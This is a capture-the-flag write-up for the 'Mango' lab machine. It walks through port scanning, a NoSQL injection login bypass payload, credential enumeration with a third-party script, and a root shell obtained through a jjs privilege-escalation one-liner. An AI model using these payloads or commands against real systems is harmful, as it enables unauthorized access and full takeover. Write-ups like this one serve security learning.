# Mango

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.1.219 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-04 09:22 EDT
Nmap scan report for 10.129.1.219
Host is up (0.012s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
```

### Port 443

Port 80 straight up denies me, and when we head to port 443 we see that this is some type of search engine:

<figure><img src="../../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

When we view the certificate, we see that there's another domain present:

<figure><img src="../../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

We can enumerate that instead, because why would they hide it if testing for SSRF wasn't a rabbit hole?

### NoSQL Injection

The HTTPS site had nothing for that domain, but the HTTP site revealed a login page:

<figure><img src="../../../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>

From reading the box name, it was obviously related to exploiting MongoDB, which does not use SQL (otherwise called NoSQL). This login page might be vulnerable to NoSQL injection. I tried this payload:

```
username[$ne]=toto&password[$ne]=toto
```

When examining requests in Burp, I found that the NoSQL Injection returned a 302.

<figure><img src="../../../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>

While the regular request returned a 200.&#x20;

<figure><img src="../../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

This to me was a clear indication that NoSQL Injection was the path here. I used a script I found on Github to find the rest:

{% embed url="https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration/blob/master/nosqli-user-pass-enum.py" %}

We can first verify the usernames:

<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

This also confirms that it works and it finds 2 users, `mango` and `admin`. Then, we can find the passwords:

<figure><img src="../../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

Then, we can use one of the passwords to SSH in:

<figure><img src="../../../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>

We can also `su` to `admin` using the other password.

<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### JJS SUID

I ran LinPEAS for to enumerate. Within the output, I found one SGID binary.

<figure><img src="../../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

We can run `jjs` to get a `root` shell. All we need to do is follow what is written on GTFOBins:

{% code overflow="wrap" %}
```
echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)').waitFor()" | /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure>

Rooted!
